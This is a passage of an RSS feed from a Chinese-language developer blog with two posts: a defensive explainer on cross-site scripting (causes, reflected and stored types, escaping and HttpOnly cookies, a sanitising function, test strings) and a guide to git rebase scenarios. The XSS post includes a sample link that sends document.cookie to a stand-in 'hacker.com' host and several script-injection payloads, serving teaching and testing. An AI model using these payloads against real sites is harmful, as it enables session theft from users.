      <pubDate>Sun, 20 December 2020 18:32:53 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2017-07-06–zhang-wo20—chang-yong-de-velocity</guid>      
   </item>

   <item>
      <title>2017-06-30 简单总结一下 XSS</title>
      <link>https://thaddeusjiang.com/2017-06-30–jian-dan-zong-jie-yi-xia-xss</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2017-06-30 简单总结一下 XSS</h1>
            <hr>

            <p>你听说过 XSS 吗？</p><p>XSS（Cross-site scripting, 跨站脚本）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。
研究表明，最近几年 XSS 已经超过 “缓冲区溢出” 成为最流行的攻击方式，有 68%的网站可能遭受此类攻击。</p><p>那么检测一下你是否充分了解 XSS 吧</p><ol><li>XSS 为什么会发生？</li><li>XSS 有几种类型？</li><li>XSS 如何预防和修复？</li></ol><p>如果可以回答 👆3 个问题，这篇文章对你提升是微乎其微的。
如果不可以，你可以花十分钟左右阅读一下。</p><p>我目前的客户是一家银行，因为企业特性和业务需求，对系统安全高度重视。</p><p>因此，我不得不分析了整个系统，从中找出未对应 XSS 的 Code 。说实话，虽然是企业内部系统，但是代码也不少，看代码看的我都快吐了。</p><blockquote><div>得益于此，让我对<code>XSS</code>的理解更加深了一层。</div></blockquote><h2 class="">1. XSS 为什么会发生？</h2><p>因为用户输入的数据被当成代码执行了。</p><p>那么，为什么用户输入的数据会被当成代码并且被执行呢？
因为当用户输入尖括号<code>&lt; &gt;</code>，引号<code>'</code> <code>"</code>，斜杠<code>/</code>之类的特殊字符时，可能**破坏原始的代码结构**，导致输入的部分内容被当成代码，并且被执行。</p><p>[小例子]
假如有下面一个 textbox</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"hello tj"</span>&gt;</span></code></pre><p><code>hello tj</code>是来自用户的输入，如果用户不是输入<code>hello tj</code>,而是输入<code>"/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p name="</code> 那么就会变成 👇 的样子。</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"address1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-built_in">document</span>.cookie)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>可不可怕？</p><h2 class="">2. XSS 有几种类型？</h2><p>XSS 有两种类型，<code>反射型XSS</code>和<code>持久型XSS</code>。</p><h3 class="">反射型 XSS</h3><p>也就是非持久型 XSS，常见诱骗用户点击带有攻击代码的 URL 链接，链接被浏览器执行，从而攻击用户。
只有当前用户被影响，影响范围：小。</p><p>[小例子]</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">a</span>
  <span class="hljs-attr">href</span>=<span class="hljs-string">"http://xxx91.com/index?term=&lt;script&gt;window.open('http://hacker.com?yourcookie='+document.cookie)&lt;/script&gt;"</span>
  &gt;</span>小姐姐<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>
&gt;</span></code></pre><p>如果你点击了 👆 链接，你 cookie 信息就有可能被发送到黑客的服务器<code>http://hacker.com</code>。</p><p>虽然链接可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏攻击代码。</p><h3 class="">持久型 XSS</h3><p>也叫存储型 XSS，提交包含攻击代码的数据到服务器。
所有浏览这部分数据的用户都将被攻击代码影响，影响范围：大</p><p>[小例子]</p><p>html 模版如下：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${message}"</span> /&gt;</span></code></pre><p>当从数据库查询的 message 如下：
<code>"/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p name="</code>
生成的 html 将变成 👇：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"address1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-built_in">document</span>.cookie)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>此时，html 可能已经不受我们控制了。</p><h2 class="">3. XSS 如何预防和修复？</h2><blockquote><div>原则：所有用户输入都是不可信的。（注意：攻击代码不一定仅在<code>&lt;script&gt;&lt;/script&gt;</code>中。）</div></blockquote><ul><li>预防 反射型 XSS</li></ul><p>将重要的 cookie 标记为<code>http only</code>，这样的话 Javascript 中的 document.cookie 语句就不能获取到 cookie 了。</p><ul><li>预防 持久型 XSS</li></ul><p>处理掉可能破坏原始代码结构的特殊字符。将特殊字符编码成转义字符，使其成为数据的一部分而不是代码。</p><p>[需要编码的 7 个字符]</p><pre><code>&amp;     –&gt;     &amp;amp;
&lt;     –&gt;     &amp;lt;
&gt;     –&gt;     &amp;gt;
"     –&gt;     &amp;quot;
`     -&gt;     &amp;#x60;
'     –&gt;     &amp;#x27;
/     –&gt;     &amp;#x2f;</code></pre><p>有两点需要特别说明的是:</p><ol><li>不推荐将单引号<code>'</code>编码为 <code>&amp;apos</code>; ，因为它并不是标准的 HTML 标签</li><li>需要对斜杠号<code>/</code>编码，因为在进行 XSS 攻击时，斜杠号对于关闭当前 HTML 标签非常有用</li></ol><h2 class="">（最后）</h2><ol><li>分享一段简单的代码</li></ol><pre class="js hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">value</span>) </span>{
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value !== <span class="hljs-string">"string"</span>) {
    <span class="hljs-keyword">return</span> value
  }
  <span class="hljs-keyword">return</span> value.replace(<span class="hljs-regexp">/[&amp;&lt;&gt;`"'\/]/g</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) </span>{
    <span class="hljs-keyword">return</span> {
      <span class="hljs-string">"&amp;"</span>: <span class="hljs-string">"&amp;amp;"</span>,
      <span class="hljs-string">"&lt;"</span>: <span class="hljs-string">"&amp;lt;"</span>,
      <span class="hljs-string">"&gt;"</span>: <span class="hljs-string">"&amp;gt;"</span>,
      <span class="hljs-string">"`"</span>: <span class="hljs-string">"&amp;#x60;"</span>,
      <span class="hljs-string">'"'</span>: <span class="hljs-string">"&amp;quot;"</span>,
      <span class="hljs-string">"'"</span>: <span class="hljs-string">"&amp;#x27;"</span>,
      <span class="hljs-string">"/"</span>: <span class="hljs-string">"&amp;#x2f;"</span>,
    }[result]
  })
}</code></pre><ol><li>分享一些用于检测 XSS 的测试用例</li></ol><pre class="html hljs"><code>&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-built_in">document</span>.cookie)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
='&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-built_in">document</span>.cookie)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-built_in">document</span>.cookie)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-built_in">document</span>.cookie)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
  alert(vulnerable)
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
%3Cscript%3Ealert('XSS')%3C/script%3E
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  alert(<span class="hljs-string">"XSS"</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert('XSS')"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://xxx.com/yyy.png"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert('XSS')"</span> /&gt;</span></code></pre><p>希望这篇文章对你有帮助。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sun, 20 December 2020 18:26:26 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2017-06-30–jian-dan-zong-jie-yi-xia-xss</guid>      
   </item>

   <item>
      <title>2017-06-23 分享几个 git 的使用场景</title>
      <link>https://thaddeusjiang.com/2017-06-23–fen-xiang-ji-ge-git–de-shi-yong-chang-jing</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2017-06-23 分享几个 git 的使用场景</h1>
            <hr>

            <p>你真的会使用 git 吗？你能回答下面几个问题吗？ 有三个 commit（顺序：CommitA、CommitB、CommitC），它们相互独立，没有依赖。</p><ol><li>在不修改 B、C 的前提下，修改 A，怎么操作？</li><li>合并 A、B、C 为一个 commit，怎么操作？</li><li>调整 A、B、C 的顺序编程 C、B、A，怎么操作？</li></ol><p>作为一个开发，日常工作中不可避免的要使用 git。 当然了，如果你技术无敌、独立承担一个项目、没人干预或者影响你的工作，那么你可能不需要下面这些总结。哈哈哈...</p><p>由于 xxx 原因，我认为应该给项目组的其他人讲讲 git。 因为语言障碍和技术熟练度的障碍，为了让同事们更好地理解并且愿意使用 git 。我不得不一个场景一个方法地讲解，所以有了下面总结。</p><blockquote><div>这难道不是一种成长吗？</div></blockquote><h2 class="">场景 1</h2><p>J 写了一个功能，分成 3 次 commit（顺序：CommitA、CommitB、CommitC）。完成功能之后，他找了 B 先生进行 Code Review，B 先生觉得 CommitB 和 CommitC 没有问题，CommitA 需要进行简单修改。 那么如何在不改变 CommitB 和 CommitC 的前提下，修改 CommitA 呢？
方法：</p><p>使用 git rebase -i，操作如下</p><p>1.    rebase CommitA、CommitB、CommitC 三个 commit</p><pre><code>$ git rebase -i &lt;parent commit of A&gt;</code></pre><p>2.    edit CommitA，将 Commit A 前面 pick 修改为edit</p><pre><code>edit d3d4537 CommitA
pick 498bf7a CommitB
pick 1d84bb8 CommitC</code></pre><p>这时 HEAD 停留在 CommitA，可以对 CommitA 进行修改，然后使用下面命令覆盖 CommitA</p><pre><code>$ git add &lt;修改文件&gt;
$ git commit -amend</code></pre><p>3.    让 git 完成后续 rebase 操作</p><pre><code>$ git rebase -continue</code></pre><h2 class="">场景 2</h2><p>J 修改了 CommitA 后，项目 leader 希望一个功能尽可能使用一个 commit 提交。 那么如何合并 CommitA、CommitB、CommitC 为一个 commit 呢？</p><h3 class="">方法：</h3><p>同样使用 git rebase -i，操作如下</p><p>1.    rebase CommitA、CommitB、CommitC 三个 commit</p><pre><code>$ git rebase -i &lt;parent commit of A&gt;</code></pre><p>2.    合并 Commits (1)CommitB 和 CommitC 前面 pick 修改为squash，然后:wq保存退出。</p><pre><code>pick fa42d43 CommitA
squash 86a09b9 CommitB
squash 360d9a3 CommitC</code></pre><p>3.    让 git 完成后续 rebase 操作</p><pre><code>$ git rebase -continue</code></pre><h2 class="">场景 3</h2><p>J 合并 CommitA、CommitB、CommitC 后，新产生的 CommitA+需要将代码更新到 master 上。但是，同一项目组的 T 已经提交了 CommitD。 本来 J 只需要 merge 自己的 CommitA+到 master 就可以了，但是 J 下一个任务依赖于 T 提交的 CommitD。 J 希望一次性更新master和自己的 branch（branch_J_dev），一石二鸟。 那么如何在 merge 自己的 CommitA+到 master 的同时将 CommitD 也 merge 到自己的 branch（branch_J_dev）中呢？</p><h3 class="">方法：</h3><p>又是使用 git rebase，操作如下</p><p>1.     rebase 自己的branch_J_dev 到 master</p><pre><code>$ git checkout branch_J_dev
$ git rebase --onto master &lt;CommitA+&gt;</code></pre><p>2.    master 合并 branch_J_dev 的提交</p><pre><code>$ git checkout master
$ git merge branch_J_dev</code></pre><p>git checkout master 和 git merge branch_J_dev 非常重要，网络上大部分教程都没有最后一步。 而且好多人都把命令写成了 <code>git rebase --ontomaster &lt;commit id&gt;</code>，看来全是抄袭同一个人的，也是醉了。哈哈哈哈... 我也是因为被坑了，所以才查了一下一下资料，发现竟然还需要一步。</p><h2 class="">场景 4（需求基本和场景 3 一致）</h2><p>如何 J 本次希望提交的代码有 CommitA+、CommitB+、CommitC+三次 commit（顺序：CommitA+、CommitB+、CommitC+）。 那么如何在 merge 自己的 CommitA+、CommitB+、CommitC+到 master 的同时将 CommitD 也 merge 到自己的 branch（branch_J_dev）中呢？</p><h3 class="">方法：</h3><p>基本和场景 3 一致，操作如下</p><p>1.    rebase 自己的branch_J_dev 到 master</p><pre><code>$ git checkout branch_J_dev
$ git rebase --onto master &lt;CommitA+&gt;^
//  ^代表，起点。&lt;CommitA+&gt;^表示 CommitA 为起点后面所有的 Commit。</code></pre><p>2.    CommitA 合并进master</p><pre><code>$ git checkout master
$ git merge branch_J_dev</code></pre><h2 class="">场景 5</h2><p>如何修改 commit 记录（调整顺序+修改 message）？ 其实这种操作没什么意义，但是对于对 commit log 有强迫症的人，或许有想修改 commit 记录的冲动。 哈哈哈哈...</p><h3 class="">方法：</h3><p>还是使用 git rebase。惊喜不惊喜？意外不意外？操作如下</p><p>1.    rebase CommitD 和 CommitA+</p><pre><code>$ git rebase -i &lt;parent commit of D&gt;</code></pre><p>2.    调整 commit 顺序，就是将 CommitD 和 CommitA+ 顺序进行调整。
3.    修改 message ，将 pick 修改为reword。
4.    让 git 完成后续 rebase 操作</p><pre><code>$ git rebase --continue</code></pre><h2 class="">（最后）小提示</h2><p>1.    如果想中途取消 rebase 操作，后悔药 👇</p><pre><code>$ git rebase --abort</code></pre><p>2.    git rebase 一旦结束，将丢失原本 branch 信息，非常危险。 我在做分享时，git rebase –onto就出现了失误并且没能找回原来 branch 信息，场面十分尴尬。 所以建议还是用 merge 吧，安全一点。</p><pre><code>$ git checkout master
$ git pull
$ git merge branch_J_dev</code></pre><p>希望这篇文章对你有帮助。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 23 June 2017 17:24:26 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2017-06-23–fen-xiang-ji-ge-git–de-shi-yong-chang-jing</guid>      
   </item>

</channel>
</rss>
